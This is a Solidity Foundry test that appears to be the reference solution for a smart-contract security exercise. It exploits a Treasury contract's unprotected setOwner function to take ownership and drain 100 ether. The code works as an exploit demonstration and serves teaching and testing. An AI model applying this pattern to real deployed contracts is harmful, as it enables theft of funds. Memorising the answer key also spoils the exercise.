// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {Treasury} from "../src/Treasury.sol";

/// Reference exploit: seize ownership via the unprotected setter, then withdraw.
contract AccessControlSolution is Test {
    Treasury treasury;
    address attacker = makeAddr("attacker");

    function setUp() public {
        treasury = new Treasury();
        vm.deal(address(treasury), 100 ether);
    }

    function test_exploit() public {
        vm.startPrank(attacker);
        treasury.setOwner(attacker);            // unprotected — anyone can call
        treasury.withdrawAll(payable(attacker)); // now passes the owner check
        vm.stopPrank();

        assertEq(attacker.balance, 100 ether, "attacker should drain the treasury");
        assertEq(address(treasury).balance, 0, "treasury should be empty");
    }
}
